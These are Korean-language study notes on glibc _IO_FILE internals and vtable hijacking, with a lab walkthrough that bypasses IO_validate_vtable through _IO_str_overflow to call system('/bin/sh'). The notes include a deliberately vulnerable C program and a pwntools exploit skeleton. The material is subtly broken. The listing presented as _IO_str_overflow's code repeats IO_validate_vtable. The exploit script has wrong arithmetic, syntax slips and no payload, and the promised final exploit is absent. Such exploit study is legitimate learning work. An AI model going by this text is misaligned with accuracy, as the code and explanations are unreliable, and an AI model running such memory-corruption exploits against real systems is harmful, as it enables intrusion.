# _IO_FILE이란?
Input, output file 시스템
glibc에서 FILE *로 사용하는 파일 스트림은 내부적으로 _IO_FILE구조체를 기반으로 작동
#include <stdio.h>

int main() {
    FILE *fp = fopen("test.txt", "r");

    char buf[100];
    fread(buf, 1, sizeof(buf), fp);

    fclose(fp);
    return 0;
}

## 개념도
            _IO_FILE
        FILE스트림 상태 관리
READ영역                write영역
_IO_READ_base           _IO_write_base
_IO_read_ptr            _IO_write_ptr
_IO_read_end            _IO_write_end
            vtable
파일 스트림 동작을 결졍하는 함수 포인터 테이블

### vtable이란
vtable은 함수 포인터들을 모아둔 테이블
glibcㅇ느 파일 스트림의 종류나 동작에 따라 서로 다른 함수를 호출해야 함
예를 들어서
파일 읽기
파일 쓰기
파일 닫기
버퍼 동기화
파일 위치 변경
등의 동작을 구현하는 함수들이 vtable을 통해 연결됨
#### a
struct _IO_jump_t {
    // 개념적인 함수 포인터 테이블
    void *finish;
    void *overflow;
    void *underflow;
    void *uflow;
    void *xsputn;
    void *xsgetn;
    void *seekoff;
    void *seekpos;
};

예를 들어서 fread()를 호출하면 내부적으로 스트림의 읽기 버퍼  상태를 확인하고 버퍼에 데이터가 부족하면 관련 내부 함술르 호출하게 됨

이 과정에서 vtable의 함수 포인터가 사용될수 있음

## 필드
_flags          스트림 상태 및 플래그
_IO_read_ptr    읽기 버퍼의 현재 위치
_IO_read_end    읽기 버퍼의 끝
_IO_read_base   읽기 버퍼의 시작
_IO_write_base  쓰기 버퍼의 시작
_IO_write_ptr   쓰기 버퍼의 현재 위치
_IO_write_end   쓰기 버퍼의 끝
_IO_buf_base    실제 버퍼의 시작
_IO_buf_end     실제 버퍼의 끝
_lock           스트림 동기화 관련 포인터
_vtable_offset  vtable 관련 오프셋
vtable          함수 포인터 테이블

## VTABLE 조작 취약점
vtable 조작 취약점은 공격자가 메모리  손상 등을 톨해 객체의 vtable 참조를 비정상적인 값으로 변경하여 프로그램의 제어 흐름에 영향을 주는 문제

정상적인 상황에서는
_IO_FILE -> 정상 vtable -> 정상 함수

손상된 스트림에서는
_IO_FILE -> 비정상 vtable 참조 -> 잘못된 함수 호출

## read 취약점 중요한 점
_IO_read_ptr < _IO_read_end
버퍼에 데이터가 부족하ㅏ면 내부 읽기 루틴을 통해 데이터를 보출하게 됨
버퍼에 데이터가 부족하면 내부 읽기 루틴을 통해 데이터를 보충하게 됨

포인터 간 관계가 깨졌을 때 발생하는 문제
버퍼 크기와 실제 할당 크기의 불일치
잘못된 포인터로 인한 메모리 접근
스트림 상태 불일치

## write 취약점 중요한 점
_IO_write_base <= _IO_write_ptr
_IO_write_ptr <= _IO_write_end
데이터를 쓰면 _IO_write_ptr가 증가하고 버퍼가 가득 차면 내부적으로 데이터를 flush하는 과정이 진행됨

해당 문제에서 발생하는 문제
잘못된 버퍼 경계
포인터 불일치
버퍼 크기 검증 누락
메모리 손상에 따른 잘못된 접근

# _IO_FILE 취약점에서 알아야 할 주요 개념
5. _IO_FILE 취약점에서 알아야 할 주요 개념
개념                            핵심 내용
Vtable Hijacking        함수 포인터 테이블을 통한 제어 흐름 변조
FSOP                    File Stream Oriented Programming
_IO_str_overflow        문자열 스트림의 overflow 관련 내부 함수
_IO_file_overflow       파일 스트림의 overflow 처리
_IO_file_underflow      파일 스트림의 underflow 처리
_IO_flush_all           여러 스트림의 출력 버퍼 flush 관련 처리
_IO_vtable_check        Vtable 검증 메커니즘


# _IO_validate_vatble 실습
// Name: bypass_valid_vtable
// gcc -o bypass_valid_vtable bypass_valid_vtable.c -no-pie 

#include <stdio.h>
#include <unistd.h>

FILE *fp;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}
int main() {
  init();

  fp = fopen("/dev/urandom", "r");

  printf("stdout: %p\n", stdout);
  printf("Data: ");

  read(0, fp, 300);

  fclose(fp);
}

## _IO_validate_vtable
예제 코드를 공격하기에 앞서 IO_validate_vtable에 대해서 이해하고 있어야 하는데 
_IO_FILE 배경 지식을 배울때 vtable을 참조하는 과정을 확인해보면 해당  함수를 호출함
아래는 IO_validate_vtable 함수 코드임

static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}

주석을 먼저 살펴보면 vtable은 __libc_IO_vtables섹션에 할당된다는 것을 알 수 있음 코드에서는 해당 섹션의 시작 주소와 끝 주소를 뺄셈하여  섹션의 크기를 알아내고 호출하려는 vtable의 주소가 섹션의 크기를 벗어나는 값이라 _IO_vtable_check함수를 호출해 에러를 발생시킴

이전 버전에서는 파일 포인터의 vtable포인터를 덮을수 있는 상황이라면 파일 함수가 참조하는 함수 포인터의 주소를 덮어써서 쉽게 공격할 수 있으나 IO_validate_vtable함수가 생겨나면서 이전 버전에서는 더 이상 같은 기법으로 공격할 수 없게 됨
따라서 해당 검사를 우회하기 위해서 __libc_IO_vtabls섹션에 존재하는 함수들 중 공격에 사요오딜 수 있는 함수를 찾아야 함

## _IO_str_overflow
_IO_str_overflow함수는 _libc_IO_vtables 섹션에 존재하는 함수임 아래는 해당 함수의 코드로 어떻게 공격에 이용할 수 있는지 살펴보면
"
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
"

### 공격 방법
#### 함수 포인터 호출
코드 하단에서 아래와 같이 파일 포인터 내 _s._allocate_buffer 라는 이름의 함수 포인터를 호출함
new_buf	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
#### 인자 설정
함수 포인터의 인자로 new_size 변수를 전달함 해당 변수는 아래와 같은 코드로 값이 결정되는데 코드를 살펴보면 _IO_FILE 구조체 변수인 _IO_buf_end와 _IO_buf_base 변수의 연산 값을 사용해서 파일 구조체를 조작할 수 있는 상황이라면 new_size변수를 조작할 수 있음
"
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
if (new_size < old_blen)   
  return EOF;
"

#### 접근 조건
함수 포인터를 호출하기 위해서는 조건문을 통과해야 하는데 아래는 함수 포인터를 호출하기 위한 조건문으로 이 또한 _IO_FILE 구조체 변수인 _IO_write_ptr 과 _IO_write_base 변수의 연산 값을 사용함 비교 구문에서 사용되는ㄴ flush_only변수는 기본값이 0이며 구문을 요약하면 pos >= _IO_blen(fp)로 추릴수 있음

따라서 _IO_write_base를 0으로 초기화하면 _IO_write_ptr값이 곧 pos변수의 값이 되므로 구문을 통과하고 함수 포인터를 호출할 수 있음
int flush_only = c == EOF;
_IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;  
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))


## 코드 분석
[*] 'bypass_valid_vtable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)



예제에서는 파일 포인터를 전역 변수로 선언하고 dev unrandom파일을 염
별도의 라이브러리 릭 없이 공격을 진행하기 위해 stdout 포인터의 주소를 출력하고 파일 포인터에 300바이트 만큼의 값을 입력할 수있음 이를 통해 _IO_FILE구조체를 조작 할 수 있음


## 익스 설계
익스의 목표는 IO_validate_vtable 함수의 검사를 우회하고 결과적으로 셸을 획득하는 것임 앞서 설명한 _IO_str_overflow 함수 내부에서 인자를 설정하고 함수 포인터를 호출하면 될 것임

1. 라이브러리 주소 계산
예제에서 라이브러리 주소를 계산 할 수 있도록 stdout 포인터의 주소를 제공함
__libc_IO_vtables 섹션을 포함한 파일 함수는 라이브러리에 맵핑되어 있기 때문에 라이브러리 베이스 주소를 게싼하고 익스 하는데 있어 필요한 함수의 주소를 알아냄

2. 인자 조작
vtable을 조작해 _IO_str_overflow 함수를 호출하기 전에 함수 포인터로 전달될 인자인 new_size를 먼저 /bin/sh문자열의 주소로 조작해야 함 new_size는 아래와 같은 수식으로 연산되는 변수이므로 _IO_buf_end를 /bin/sh주소로 _IO_buf_base를 0으로 덮어쓰면 됨
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)

3. vtable 조작
vtable을 조작할떄는 IO_validate_vtable 함수의 검사를 우회할 수 있는 주소로 덮어써야 함 먼저 예제코드에서는 파일 구조체를 덮어쓸 수 있는 코드가 수행되고 fclose 함수를 호출함 fclose는 내부적으로 _IO_FINISH함수를 호출하는데 이 함수가 _IO_FINISH함수를 참조하기 전에 파일 구조체의 vtable주소를 조작해 IO_str_overflow 함수를 참조하게 만든다면 해당 함수 내부에서 호출하는 함수 포인터를 system으로 조작해 셸을 얻을수 있음


from pwn import *
p = process('./bypass_valid_vtable')
e= ELF('./bypass_valid_vtable')
libc = ELF(libc.so.6)
p.recvuntil(b'stdout: ')
leak = int(p.recvuntil(b'\n').strip(b'\n'), 16)
libc_base = leak = libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libc_base - libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
io_str_overflow = io_str_overflow - 16
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
fp = e.symbols['fp']
p.interactive

코드를 살펴보면 IO_str_overflow 함수를 호출하기 위해 해당 함수 주소가 위치한 주소를 알아내고 fake_vtable이란 이름으로 IO_str_overflow 함수 주소가 위치한 주소에서 16을 밴 주소를 저장함 또한, 함수 포인터와 인자를 조작하기 위해 /bin/sh 문자열의 주소와 시스템 함수의 주소를 미리 계산함

공격에 필요한 모든 주소를 알아냈다면 인자를 /bin/sh 문자열의 주소로 조작해야 함


### 인자 조작
IO_str_overflow 함수 내부에서 호출하는 함수 포인터를 조작하기 전에 전달되는 인자가 /bin/sh 문자열을 가리키도록 해야 함 앞서 알아봤듯이 IO_str_oveflow 함수 내 new_size 변수는 아래와 같은 계산식으로 값이 결정되므로 아래와 같이 _IO_buf_end를 /bin/sh문자열의 주소로 _IO_buf-base를 0으로 조작해야 함
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
익스 코드를 보면 new_size 연산하는데 필요한 _IO_write_ptr 변수를 _IO_buf_end와 똑같이 설정하는 것을 볼수 있음 이는 함수 포인터를 호출하는데에 필요한 다음과 같은 조건을 충족하기 위해서 덮어쓴것임
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))

### vtable 조작
공격에 필요한 리이브러릴 주소를 계싼하고 인자를 모두 조작했다면 vtable을 조작해 _IO_str_overflow 함수를 호출하고 내부에서 호출하는 함수 포인터를 덮어 쓰면 됨

fclose 는 내부에서 _IO_FINISH를 호출하는데 이는 vtable 주소로부터 16바이트를 덧셈한 위치에 있는 주소를 호춯함 따라서 vtable의 주소를 IO_str_overflow - 16주소로 덮어쓴다면 fcloses는 결국 _IO_str_ovoerflow함수를 호출하게 됨

해당 함수 내에서 호출되는 함수 포인터는 fp->_s._allocate_buffer로 이는 vtable 주소가 우이치한 다음 8바이트를 의미함 따라서 조작한 vtable 주소 뒤에 system 함수의 주소를 덮어쓰면 최종적으로 system('/bin/sh')코드가 실행됨

아래코드는 라이브러리 주소를 계산한하고 함수 포인터의 인자가 binsh를 가리키게 한뒤 IO_str_overflow에서 호출하는 함수 포인터를 system으로 덮어쓴 최종 익스임


# 요약
파일 구조체 내 vtable 을 조작하는 공격 기법을 막기 위한 IO_validate_vatble 하마수를 우회하는 실습

해당 함수는 파일 함수가 참조하는 vtable의 함수 주소가 __libc_IO_vtables 섹션에 있는 함수 중 내부에서 조작 할 수 있는 ㄱ밧을 함수 퐁니터로 호출하는 IO_str_overflow를 이용하여 해당 보호 기법을 우회하고 셸을 얻는 것임


glibc2.29버전 이상의 라이브러리는 IO_str_overflow 함수 내부에서 함수 포인터를 호출하는 코드가 삭제되어 있음
